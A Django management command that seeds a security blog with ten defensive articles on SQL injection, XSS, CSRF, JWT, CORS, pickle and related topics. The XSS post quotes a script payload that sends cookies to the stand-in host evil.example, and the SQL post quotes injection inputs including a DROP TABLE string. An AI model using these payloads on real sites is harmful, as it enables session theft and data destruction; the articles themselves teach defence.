from django.core.management.base import BaseCommand
from django.utils import timezone
from datetime import timedelta

from blog.models import Post, Category


class Command(BaseCommand):
    help = 'Seed the blog with production-quality starter articles.'

    def handle(self, *args, **options):
        categories = {
            'django-security': 'Django Security',
            'owasp': 'OWASP & Standards',
            'appsec-basics': 'AppSec Basics',
            'vibe-coding': 'AI & Vibe Coding',
        }
        cat_objs = {}
        for slug, name in categories.items():
            cat, _ = Category.objects.get_or_create(slug=slug, defaults={'name': name})
            cat_objs[slug] = cat

        now = timezone.now()

        posts = [
            {
                'title': 'A Practical Guide to Preventing SQL Injection in Django',
                'slug': 'preventing-sql-injection-in-django',
                'category': cat_objs['django-security'],
                'reading_time_minutes': 7,
                'excerpt': 'SQL injection is still the most common way Django apps get breached in 2026 — almost always through .raw(), .extra(), or a stray f-string, never through the ORM itself.',
                'published_at': now - timedelta(days=2),
                'body_html': '''
<p>SQL injection has been on the OWASP Top 10 for over two decades, and it still shows up in production Django applications on a regular basis. That's not because Django's ORM is unsafe &mdash; it's because developers step outside the ORM to write raw SQL, and that's where things go wrong.</p>

<h2>Where it actually happens</h2>
<p>The Django ORM parameterizes queries by default. <code>User.objects.filter(username=username)</code> is safe no matter what <code>username</code> contains, because Django never builds a SQL string by concatenating your input &mdash; it passes the value separately to the database driver. The driver treats it strictly as data, never as part of the query structure.</p>
<p>The trouble starts the moment someone reaches for <code>.raw()</code>, <code>.extra()</code>, or a direct <code>cursor.execute()</code> call, usually to solve a performance problem or write a query the ORM can't express cleanly. That's a completely reasonable thing to need. The mistake is building the SQL string with Python string formatting instead of passing parameters:</p>
<pre><code># Vulnerable
query = "SELECT * FROM orders WHERE customer_id = " + customer_id
cursor.execute(query)

# Also vulnerable - f-strings don't make this safe
cursor.execute(f"SELECT * FROM orders WHERE customer_id = {customer_id}")</code></pre>
<p>Both of these let an attacker submit something like <code>1 OR 1=1</code> or <code>1; DROP TABLE orders;--</code> as <code>customer_id</code> and have it interpreted as SQL rather than data.</p>

<h2>The fix is almost always the same one line</h2>
<pre><code># Safe - the driver escapes the parameter for you
cursor.execute("SELECT * FROM orders WHERE customer_id = %s", [customer_id])</code></pre>
<p>Every major Python database driver supports this parameter-substitution syntax. It's not slower, it's not more verbose in any meaningful way, and it closes the vulnerability completely because the database never sees your input as part of the query text.</p>

<h2>A subtlety: <code>.extra()</code> is deprecated for a reason</h2>
<p>Django's <code>QuerySet.extra()</code> method has been soft-deprecated in favor of expressions and <code>RawSQL</code> partly because it's so easy to misuse. If you're maintaining an older codebase and see <code>.extra(where=[...])</code> with string formatting inside it, treat it as a priority to audit &mdash; it has the exact same injection surface as a raw cursor call.</p>

<h2>What actually catches this in review</h2>
<p>The pattern is mechanical enough that it doesn't require deep security expertise to spot: any place where a SQL string is built with <code>+</code>, <code>%</code>, <code>.format()</code>, or an f-string, and any part of that string originates from a request (GET, POST, headers, cookies, or even another database record that a user previously controlled), is worth a second look. That's exactly what Fora AI's rule engine checks for automatically on every scan, so you don't have to remember to look for it on every pull request.</p>

<h2>Takeaway</h2>
<p>Stay inside the ORM whenever you can. When you can't, parameterize. The discipline costs you nothing and it's the single highest-leverage habit for keeping SQL injection out of a Django codebase.</p>
''',
            },
            {
                'title': "OWASP Top 10, Explained for Working Developers",
                'slug': 'owasp-top-10-explained-for-developers',
                'category': cat_objs['owasp'],
                'reading_time_minutes': 9,
                'excerpt': "The OWASP Top 10 gets cited constantly in security tooling, but most of it reads like a compliance checklist. Here's what each category actually means for the code you write day to day.",
                'published_at': now - timedelta(days=6),
                'body_html': '''
<p>If you've used any security scanner &mdash; including this one &mdash; you've seen issues tagged with things like "A03:2021" or "A07:2021." These reference numbers come from the OWASP Top 10, a list maintained by the Open Web Application Security Project that gets updated every few years based on real-world breach data. It's useful, but the official descriptions are written for security teams, not for someone shipping a feature on a Tuesday. Here's a translation.</p>

<h2>A01: Broken Access Control</h2>
<p>This is the most common category in the current list, and it's rarely a single bug &mdash; it's usually a missing check. A user can view another user's invoice by changing an ID in the URL. An API endpoint checks that you're logged in but not that you own the resource you're requesting. If your authorization logic is "are they logged in?" instead of "are they allowed to do <em>this specific thing</em>?", you have this problem somewhere.</p>

<h2>A02: Cryptographic Failures</h2>
<p>This used to be called "Sensitive Data Exposure," and the rename is more accurate: it's about how data is protected, not just whether it leaks. Storing passwords with MD5 or SHA-1 instead of a purpose-built algorithm like Argon2 or bcrypt falls here. So does transmitting anything sensitive over plain HTTP, or generating a password-reset token with <code>random.random()</code> instead of the <code>secrets</code> module.</p>

<h2>A03: Injection</h2>
<p>SQL injection is the famous example, but the category covers any place untrusted input changes the meaning of a command &mdash; command injection through <code>os.system()</code>, template injection through unescaped output, LDAP injection, and so on. The common thread is treating user input as code instead of data.</p>

<h2>A04: Insecure Design</h2>
<p>This one is newer and broader than the others &mdash; it's not a specific bug pattern but a category for flaws baked into how a feature was designed in the first place. A checkout flow that trusts a client-supplied price. A password-reset flow with no rate limiting. These aren't fixed by a patch; they need the feature rethought.</p>

<h2>A05: Security Misconfiguration</h2>
<p>Default credentials left in place. <code>DEBUG=True</code> in production, quietly leaking stack traces and settings values to anyone who triggers a 500 error. Missing security headers. This category is unglamorous but accounts for a huge share of real incidents, because it's easy to get right in development and forget to lock down before shipping.</p>

<h2>A06: Vulnerable and Outdated Components</h2>
<p>Every dependency you install is code you didn't write running with your application's permissions. A known CVE in an old version of a package you haven't updated in two years is functionally the same as writing the vulnerability yourself.</p>

<h2>A07: Identification and Authentication Failures</h2>
<p>Weak password policies, session tokens that don't expire, login endpoints with no rate limiting that allow unlimited password guesses. This is the category behind most account-takeover incidents.</p>

<h2>A08: Software and Data Integrity Failures</h2>
<p>This covers things like insecure deserialization &mdash; unpickling data from a source you don't fully trust, which in Python can execute arbitrary code as a side effect of just loading the data. It also covers CI/CD pipelines that pull unverified dependencies or update packages automatically without any integrity check.</p>

<h2>A09: Security Logging and Monitoring Failures</h2>
<p>If a breach happens and nobody notices for six months because nothing was logged, the breach itself often becomes the smaller problem. This category is about having enough visibility to detect and respond to an incident quickly.</p>

<h2>A10: Server-Side Request Forgery (SSRF)</h2>
<p>If your server fetches a URL on behalf of a user &mdash; to generate a thumbnail, follow a webhook, or check a link &mdash; and that URL isn't validated, an attacker can point it at your internal network. This has been used repeatedly to reach cloud metadata endpoints and steal credentials.</p>

<h2>Why this list matters for tooling</h2>
<p>Every issue Fora AI's scanner surfaces is mapped back to one of these categories, partly so the report is useful to a security-minded reader, and partly because the mapping forces some discipline on what counts as a real, cited finding rather than a vague warning.</p>
''',
            },
            {
                'title': 'Why Hardcoded API Keys Keep Ending Up in Production',
                'slug': 'why-hardcoded-api-keys-keep-happening',
                'category': cat_objs['appsec-basics'],
                'reading_time_minutes': 6,
                'excerpt': "It's the single most common finding in almost every codebase we scan. Not because developers don't know better, but because the environment-variable version is one extra step slower during a demo.",
                'published_at': now - timedelta(days=10),
                'body_html': '''
<p>Ask any developer whether hardcoding an API key into source is a bad idea, and they'll say yes without hesitation. Then look at almost any real codebase &mdash; especially anything built quickly, for a hackathon, a prototype, or "just to get it working" &mdash; and you'll find one anyway. This isn't a knowledge problem. It's a friction problem.</p>

<h2>The moment it happens</h2>
<p>It rarely starts as a decision. It starts as debugging. You're testing a third-party API integration, the environment variable isn't loading for some reason, so you paste the key directly into the function just to confirm the request works. It works. You move on to the next thing. The key stays.</p>
<p>Later, someone runs <code>git add .</code> without checking the diff carefully, and the key is now in the commit history &mdash; which, importantly, doesn't go away even if you delete the line in a later commit. Anyone with clone access to that repository, at any point in the future, can find it by searching the history.</p>

<h2>Why "it's a private repo" doesn't fully solve this</h2>
<p>A private repository narrows who can see the key, but it doesn't eliminate the risk categories that matter most:</p>
<ul>
<li>Contractors, former employees, or anyone who briefly had repo access retain whatever they cloned.</li>
<li>If the repo is ever made public &mdash; open-sourced later, or accidentally toggled &mdash; the entire history goes with it.</li>
<li>CI/CD logs, error-tracking tools, and support tickets often include full stack traces that can leak a hardcoded value even if the repo itself stays private.</li>
</ul>

<h2>The fix, and why it's worth the extra 30 seconds</h2>
<p>Environment variables solve this cleanly:</p>
<pre><code>import os
API_KEY = os.environ["STRIPE_SECRET_KEY"]</code></pre>
<p>The key lives in a <code>.env</code> file (excluded from version control via <code>.gitignore</code>) locally, and in your hosting platform's environment variable settings in production. It's not committed, it's not in your logs by default, and rotating it is a config change rather than a code deploy.</p>
<p>The friction that causes people to skip this step is almost always a missing habit, not a missing tool &mdash; keep a <code>.env.example</code> file in the repo with every variable name and no real values, so the "correct" path is exactly as fast as the shortcut.</p>

<h2>If a key has already been exposed</h2>
<p>Rotate it. Don't just remove the line from the current file &mdash; the old value is still valid until you generate a new one and revoke the old one at the provider. Removing it from the code without rotating the key protects you from nothing.</p>
''',
            },
            {
                'title': 'CSRF Protection in Django: What It Actually Does',
                'slug': 'csrf-protection-in-django-explained',
                'category': cat_objs['django-security'],
                'reading_time_minutes': 6,
                'excerpt': "Almost every Django developer has typed {% csrf_token %} without stopping to ask what it's actually defending against, or what @csrf_exempt quietly removes.",
                'published_at': now - timedelta(days=14),
                'body_html': '''
<p>Cross-Site Request Forgery is one of those vulnerabilities that's easy to forget about precisely because Django handles it well by default. The middleware is on, the template tag is one line, and most developers never think about it again &mdash; until a form breaks in an unfamiliar way, someone Googles the error, and the fix that comes back is <code>@csrf_exempt</code>.</p>

<h2>The actual attack</h2>
<p>Say you're logged into your bank's website in one tab. In another tab, you visit a malicious page. That page contains a form that auto-submits a POST request to <code>yourbank.com/transfer</code> with the attacker's account number as the destination. Your browser will happily include your bank's session cookie with that request, because cookies are sent automatically to their originating domain regardless of which page triggered the request. Without CSRF protection, your bank's server has no way to distinguish "the user submitted this form on our site" from "some other site tricked the user's browser into submitting it."</p>

<h2>How the token fixes this</h2>
<p>Django's CSRF protection adds a second, unpredictable value that has to be present in the request body &mdash; not just the cookie. Because the attacker's page doesn't have permission to read your bank's cookies or generate a valid matching token (same-origin policy prevents that), it can't reproduce this value, and the server rejects the forged request. That's what <code>{% csrf_token %}</code> renders into the form, and what <code>CsrfViewMiddleware</code> validates on the way in.</p>

<h2>What <code>@csrf_exempt</code> actually removes</h2>
<p>This decorator doesn't add an alternative protection &mdash; it removes the check entirely for that view. There are legitimate reasons to do this: a webhook endpoint that receives POST requests from a third-party service (like a payment processor) can't include a Django CSRF token, because it's not a form your own templates rendered.</p>
<p>The mistake is reaching for <code>@csrf_exempt</code> on a view that <em>is</em> reachable from a browser with a logged-in session, just because it was throwing an error during development. If you're exempting a webhook, verify the request some other way &mdash; almost every provider (Stripe, PayPal, GitHub) signs their webhook payloads with a secret you can check instead.</p>

<h2>A quick self-check</h2>
<p>If you see <code>@csrf_exempt</code> in a codebase, ask: does this endpoint only ever receive requests from a server-to-server integration with its own signature verification? If yes, it's probably fine. If it's a normal form a logged-in user submits from your own frontend, it shouldn't be there.</p>
''',
            },
            {
                'title': 'Secure Password Storage: Beyond Just Hashing',
                'slug': 'secure-password-storage-beyond-hashing',
                'category': cat_objs['appsec-basics'],
                'reading_time_minutes': 8,
                'excerpt': "\"We hash passwords\" isn't actually a complete answer. Which algorithm, how it's salted, and how comparisons happen all matter just as much as the fact that hashing happens at all.",
                'published_at': now - timedelta(days=20),
                'body_html': '''
<p>Every engineer knows not to store passwords in plaintext. Fewer stop to check <em>which</em> hashing approach their stack is actually using, and that gap is where a surprising number of real-world breaches turn from "annoying" into "catastrophic."</p>

<h2>Not all hashing is equal</h2>
<p>MD5 and SHA-1 are cryptographic hash functions, and it's tempting to assume "hashed" means "safe." It doesn't, for password storage specifically. These algorithms were designed to be fast &mdash; which is exactly the wrong property for a password hash. An attacker with a stolen database of MD5-hashed passwords can test billions of guesses per second on off-the-shelf GPU hardware, because MD5 was never designed to resist that.</p>
<p>Purpose-built password hashing algorithms &mdash; Argon2, bcrypt, and scrypt &mdash; are deliberately slow and memory-intensive. That's a feature: it makes brute-forcing computationally expensive even at scale. Django's default password hasher uses PBKDF2 with a high iteration count for exactly this reason, and can be configured to use Argon2 instead if you install <code>argon2-cffi</code>.</p>

<h2>Salting isn't optional</h2>
<p>A salt is random data added to each password before hashing, unique per user. Without it, two users with the same password produce identical hashes, and an attacker can precompute a lookup table (a "rainbow table") of common password hashes once and reuse it against every breached database they encounter. Django salts automatically; if you're ever tempted to write custom authentication logic, this is one of the easiest things to get subtly wrong.</p>

<h2>The comparison itself matters too</h2>
<p>Even with a strong hash, comparing values incorrectly can reintroduce risk. A plain <code>==</code> comparison between two strings in Python returns as soon as it finds a mismatched character, which means the operation takes very slightly longer for strings that match further before diverging. In a security-critical comparison, that timing difference can theoretically be measured and exploited to guess a secret one character at a time. Django's <code>check_password()</code> uses a constant-time comparison specifically to close this off &mdash; it's one more reason not to write custom password-checking logic by hand.</p>

<h2>What this means practically</h2>
<p>For almost every Django project, the right amount of custom password-security code is zero. Use <code>django.contrib.auth</code>, let <code>AUTH_PASSWORD_VALIDATORS</code> enforce minimum strength, and let <code>authenticate()</code> and <code>check_password()</code> handle hashing and comparison. The moments this becomes a real design decision are when you're migrating away from a legacy hashing scheme, or integrating with an external identity provider &mdash; and in both cases, it's worth treating as a deliberate architecture review rather than an incidental implementation detail.</p>
''',
            },
            {
                'title': 'Cross-Site Scripting (XSS): The Bug That Hides in Plain Sight',
                'slug': 'cross-site-scripting-xss-explained',
                'category': cat_objs['appsec-basics'],
                'reading_time_minutes': 7,
                'excerpt': "XSS survives because it looks harmless in the editor — it only becomes obvious once someone else's browser runs your attacker's script instead of your app.",
                'published_at': now - timedelta(days=1),
                'body_html': '''
<p>Cross-Site Scripting is one of the oldest entries on the OWASP Top 10, and it keeps reappearing for a simple reason: the vulnerable code and the safe code look almost identical, and the difference only matters the moment untrusted input reaches the page.</p>

<h2>What actually goes wrong</h2>
<p>XSS happens when user-controlled input ends up in a page as raw HTML instead of as text. If a comment field lets someone submit <code>&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;</code> and your template renders that comment without escaping it, every visitor who views that comment runs the attacker's script in their own browser, with their own session and cookies. The attacker didn't touch your server &mdash; they used your page as the delivery mechanism.</p>

<h2>Why templating engines mostly save you</h2>
<p>Django's template engine escapes variables by default. <code>{{ comment.text }}</code> converts <code>&lt;</code> and <code>&gt;</code> into <code>&amp;lt;</code> and <code>&amp;gt;</code> automatically, so a submitted <code>&lt;script&gt;</code> tag renders as visible text on the page instead of executing. The vulnerability shows up the moment someone opts out of this &mdash; usually with <code>{{ comment.text|safe }}</code> or <code>mark_safe()</code>, almost always because a legitimate feature (like letting users format text with basic HTML) needs raw markup to render.</p>

<pre><code># Safe by default - renders as visible text, not executable
{{ user_comment }}

# Dangerous - renders whatever HTML the user submitted, as-is
{{ user_comment|safe }}</code></pre>

<h2>The three flavors, briefly</h2>
<p><strong>Stored XSS</strong> is the comment-field example above &mdash; the payload lives in your database and fires for every subsequent visitor. <strong>Reflected XSS</strong> comes back in a response immediately, often through a search box or error message that echoes the query string back into the page. <strong>DOM-based XSS</strong> happens entirely in the browser, when client-side JavaScript takes something like <code>location.hash</code> and inserts it into the page with <code>innerHTML</code> instead of <code>textContent</code>.</p>

<h2>If you genuinely need to allow some HTML</h2>
<p>If users are supposed to submit formatted text &mdash; bold, links, lists &mdash; the fix isn't to trust the raw input, it's to sanitize it through an allow-list library (like <code>bleach</code> in Python) that strips anything not on a pre-approved list of tags and attributes, before it's ever marked safe and rendered.</p>

<h2>Takeaway</h2>
<p>Escaping is the default for a reason. Every <code>|safe</code>, <code>mark_safe()</code>, or <code>innerHTML</code> assignment is a place where that default was deliberately turned off, which makes it exactly the kind of line worth a second look during review &mdash; and exactly what a scanner should flag automatically instead of relying on someone remembering to check.</p>
''',
            },
            {
                'title': 'JWT Authentication: The Mistakes That Undo the Whole Point',
                'slug': 'jwt-authentication-common-mistakes',
                'category': cat_objs['owasp'],
                'reading_time_minutes': 8,
                'excerpt': "JWTs are self-contained by design, which is exactly what makes a handful of small implementation mistakes turn into full authentication bypasses.",
                'published_at': now - timedelta(days=4),
                'body_html': '''
<p>JSON Web Tokens are popular for good reason &mdash; they let a server verify who a user is without a database lookup on every request. That same self-contained design is also why a few specific implementation mistakes turn into complete authentication bypasses rather than minor bugs.</p>

<h2>Mistake one: trusting the <code>alg</code> header</h2>
<p>A JWT's header declares which algorithm was used to sign it. Some libraries, in early or misconfigured versions, will happily verify a token using whatever algorithm the token itself claims &mdash; including <code>none</code>, which some implementations treat as "no signature required." An attacker can take a legitimate token, change the payload (say, their user role from <code>user</code> to <code>admin</code>), set the algorithm header to <code>none</code>, strip the signature, and have it accepted. The fix is to always specify the expected algorithm explicitly on the verifying side, never read it from the token being verified.</p>

<h2>Mistake two: confusing signing with encryption</h2>
<p>A standard JWT is signed, not encrypted. Anyone who intercepts it can base64-decode the payload and read it in plaintext &mdash; they just can't modify it without invalidating the signature (assuming the algorithm check above is correct). Storing sensitive data like a password, a full credit card number, or private personal details directly in the payload is a common and avoidable mistake, because "the user can't tamper with it" doesn't mean "the user can't read it."</p>

<h2>Mistake three: no expiry, or no revocation path</h2>
<p>A JWT with no <code>exp</code> claim, or an unreasonably long one, is valid forever once issued. Because JWTs are stateless by design, there's no server-side session to invalidate the way there is with a traditional session cookie &mdash; if a token leaks, it stays usable until it expires on its own. Short expiry windows paired with a refresh-token flow (where the long-lived refresh token <em>is</em> tracked server-side and can be revoked) is the standard way to keep the stateless benefit without losing the ability to cut off a compromised session.</p>

<h2>Mistake four: weak or hardcoded signing secrets</h2>
<p>HMAC-based JWTs (<code>HS256</code>) are only as strong as the shared secret used to sign them. A short, guessable, or hardcoded-in-source secret can be brute-forced offline once an attacker has even one valid token to test guesses against. This is the same category of mistake as a hardcoded API key, with a worse consequence &mdash; recovering the secret means forging tokens for any user, including ones that don't exist yet.</p>

<h2>Takeaway</h2>
<p>JWTs push a lot of decisions that used to be the server's job onto the token format itself. That's the appeal, but it also means algorithm confusion, missing expiry, and weak secrets don't degrade gracefully &mdash; they tend to fail all the way open.</p>
''',
            },
            {
                'title': "CORS Misconfiguration: What Access-Control-Allow-Origin: * Actually Costs You",
                'slug': 'cors-misconfiguration-explained',
                'category': cat_objs['appsec-basics'],
                'reading_time_minutes': 6,
                'excerpt': "Setting Access-Control-Allow-Origin to * is the fastest way to silence a CORS error during development — and one of the easiest security decisions to forget to undo.",
                'published_at': now - timedelta(days=8),
                'body_html': '''
<p>Every developer has hit a CORS error in the browser console at least once, and almost every developer's first instinct is the same Stack Overflow answer: add <code>Access-Control-Allow-Origin: *</code> and move on. That header does exactly what it says &mdash; it tells browsers that literally any website is allowed to read responses from your API &mdash; and in a lot of cases that's a much bigger door to open than the error message made it feel like.</p>

<h2>What CORS is actually protecting</h2>
<p>The browser's same-origin policy normally stops JavaScript running on <code>evil.example</code> from reading a response returned by <code>yourapp.com</code>, even if the user's browser happily sends the request (with their cookies attached). CORS headers are how <code>yourapp.com</code> explicitly opts certain other origins into being allowed to read that response. It's an opt-in relaxation of a default protection &mdash; not a security feature to configure defensively, but a permission slip you're handing out.</p>

<h2>Where the wildcard becomes a real problem</h2>
<p>For a public, unauthenticated API &mdash; a weather endpoint, a public dataset &mdash; a wildcard origin is usually fine, because there's no user-specific session or secret data being returned. The risk shows up when that same wildcard is applied to authenticated endpoints. Combined with <code>Access-Control-Allow-Credentials: true</code> (which some frameworks allow you to pair with a wildcard, and some correctly refuse to), a malicious site can make a request that includes the victim's session cookie and read back their private data, because the browser was told any origin is allowed to.</p>

<pre><code># Fine for a public, unauthenticated endpoint
Access-Control-Allow-Origin: *

# Risky if this endpoint returns anything user-specific or session-gated
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true</code></pre>

<h2>The fix is almost always an explicit allow-list</h2>
<p>Most frameworks, including Django (via <code>django-cors-headers</code>), support an explicit list of allowed origins: <code>CORS_ALLOWED_ORIGINS = ["https://yourapp.com", "https://app.yourapp.com"]</code>. This keeps the same convenience for your own frontend while refusing the request outright for any origin you didn't name. It's one config change, and it's easy to get right once you know to look for the wildcard on anything that isn't fully public data.</p>

<h2>Takeaway</h2>
<p>A CORS error in development almost always means the browser is doing its job. The fix is naming the origins you actually trust, not removing the check entirely with a wildcard that's easy to add under deadline pressure and easy to forget to narrow later.</p>
''',
            },
            {
                'title': "Insecure Deserialization in Python: Why pickle.load() Can Run Arbitrary Code",
                'slug': 'insecure-deserialization-python-pickle',
                'category': cat_objs['owasp'],
                'reading_time_minutes': 7,
                'excerpt': "pickle.load() doesn't just read data back into memory — for untrusted input, it can execute arbitrary Python as a side effect of loading it.",
                'published_at': now - timedelta(days=12),
                'body_html': '''
<p>Python's <code>pickle</code> module is convenient enough that it shows up in places it probably shouldn't &mdash; caching objects, passing data between processes, storing session data. The documentation is direct about the risk, but it's easy to miss if you're reaching for <code>pickle</code> as a quick way to serialize an object rather than reading through the security notes first.</p>

<h2>Why this is different from a normal parsing bug</h2>
<p>Formats like JSON describe data &mdash; strings, numbers, lists, objects &mdash; and a JSON parser can only ever produce those things. <code>pickle</code> describes <em>how to reconstruct a Python object</em>, which can include instructions to call arbitrary functions with arbitrary arguments during reconstruction. A crafted pickle payload can include a call to <code>os.system()</code> or <code>subprocess.run()</code> as part of "rebuilding" an object, and that call executes the moment <code>pickle.load()</code> processes it &mdash; before your code even gets to inspect the result.</p>

<pre><code># If `data` came from a request, a cookie, or any source you don't
# fully control, this line can execute attacker-chosen code
import pickle
obj = pickle.loads(data)</code></pre>

<h2>Where this sneaks into real applications</h2>
<p>The obvious case is an API that accepts a pickled object directly. The less obvious cases are more common: a caching layer (Redis, Memcached) that pickles Python objects for storage, where the cache itself might be reachable or poisonable by another part of the system; or a session backend that pickles session data and stores it somewhere a user could potentially influence, like a signed cookie with a weak or leaked signing key.</p>

<h2>The fix depends on what you actually need</h2>
<p>If you're serializing plain data &mdash; dicts, lists, strings, numbers &mdash; <code>json</code> does the same job and can't execute code on load, full stop. If you need to serialize more complex Python objects and the data never crosses a trust boundary (it's generated and consumed entirely by your own backend, never touched by user input), <code>pickle</code> is fine. The moment the serialized data could have been touched, stored, or influenced by an external party, it needs to either move to a safe format or be cryptographically signed and verified before deserialization &mdash; and even then, signing only proves authenticity, not that the format itself is safe to process from a source you don't fully control.</p>

<h2>Takeaway</h2>
<p><code>pickle.load()</code> should be treated the same way as <code>eval()</code>: fine for data you generated yourself, and a code-execution vulnerability the instant it touches anything from outside your own system.</p>
''',
            },
            {
                'title': "Why AI-Generated Code Needs a Security Pass Before It Ships",
                'slug': 'ai-generated-code-security-review',
                'category': cat_objs['vibe-coding'],
                'reading_time_minutes': 7,
                'excerpt': "AI coding assistants are excellent at making code that runs. They're not evaluating whether it's safe to expose to the internet — that part is still on you.",
                'published_at': now - timedelta(days=3),
                'body_html': '''
<p>Building an app by describing what you want and having an AI assistant generate the code &mdash; often called "vibe coding" &mdash; has made it dramatically faster to go from idea to a working prototype. It hasn't changed what makes an application secure. The gap between "the code runs and does what I asked" and "the code is safe to expose to real users" is exactly the same gap it's always been; it's just less visible when you didn't type every line yourself.</p>

<h2>The code is optimized for working, not for being attacked</h2>
<p>Ask an AI assistant for a file upload endpoint, and you'll almost always get something that accepts a file and saves it &mdash; because that satisfies the request. Whether it validates file type, caps file size, checks the filename for path traversal characters like <code>../</code>, or stores uploads outside the web root, depends entirely on whether you asked for those things specifically. The generated code is a correct answer to the prompt, not a complete answer to "is this safe to put on the internet."</p>

<h2>Patterns worth checking specifically</h2>
<p>A few things show up disproportionately often in AI-generated code that hasn't had a security pass:</p>
<ul>
<li><strong>Hardcoded secrets</strong> &mdash; API keys or database credentials written directly into example code, because that's the fastest way to produce something that runs in a demo.</li>
<li><strong>Missing authorization checks</strong> &mdash; an endpoint that checks a user is logged in, but not that they own the specific resource they're requesting.</li>
<li><strong>Permissive CORS and debug settings</strong> &mdash; wildcards and <code>DEBUG=True</code>-style flags that are reasonable defaults for getting something running locally, and dangerous defaults for something deployed.</li>
<li><strong>Unvalidated input passed straight into a query, a command, or a template</strong> &mdash; the same injection and XSS patterns covered elsewhere on this blog, just generated at higher volume and higher speed than a human typing line by line.</li>
</ul>

<h2>This isn't a reason to avoid AI-assisted development</h2>
<p>The speed is real and worth using. The point isn't that AI-generated code is worse than human-written code &mdash; plenty of human-written code has the exact same gaps. It's that the volume of code shipped per hour goes up significantly, and a security review step that used to happen implicitly (a developer spending an hour writing the endpoint and thinking about edge cases along the way) needs to happen explicitly instead, because it's no longer built into the time it took to produce the code.</p>

<h2>What a quick pass should look for</h2>
<p>Before shipping anything generated quickly &mdash; by AI or otherwise &mdash; it's worth scanning specifically for hardcoded credentials, missing input validation on anything user-facing, authorization checks on every endpoint that touches another user's data, and default configuration flags that were meant for local development. That's a fast, mechanical check, which is exactly the kind of thing worth automating rather than relying on remembering to do it manually on every new file.</p>
''',
            },
        ]

        for data in posts:
            slug = data.pop('slug')
            post, created = Post.objects.update_or_create(slug=slug, defaults=data)
            status = 'Created' if created else 'Updated'
            self.stdout.write(self.style.SUCCESS(f'{status} post: {post.title}'))
